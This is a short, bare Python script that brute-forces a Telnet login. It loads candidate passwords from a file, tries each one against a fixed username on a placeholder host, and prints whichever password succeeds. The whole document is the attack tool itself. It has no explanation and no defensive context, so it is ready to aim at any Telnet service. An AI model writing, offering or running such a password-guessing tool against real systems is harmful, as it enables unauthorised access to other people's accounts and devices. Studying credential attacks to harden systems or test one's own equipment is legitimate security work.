import telnetlib

host = 'hostname'
port = 23
username = 'username'
passwords_file = 'passwords.txt'

with open(passwords_file, 'r') as f:
    passwords = f.readlines()

tn = telnetlib.Telnet(host, port)

for password in passwords:
    password = password.strip()
    tn.read_until(b"Username: ")
    tn.write(username.encode('ascii') + b"\n")
    tn.read_until(b"Password: ")
    tn.write(password.encode('ascii') + b"\n")
    result = tn.expect([b"Login incorrect", b"Last login"], timeout=2)
    if result[0] == 1:
        print("Password found: {}".format(password))
        break

tn.close()
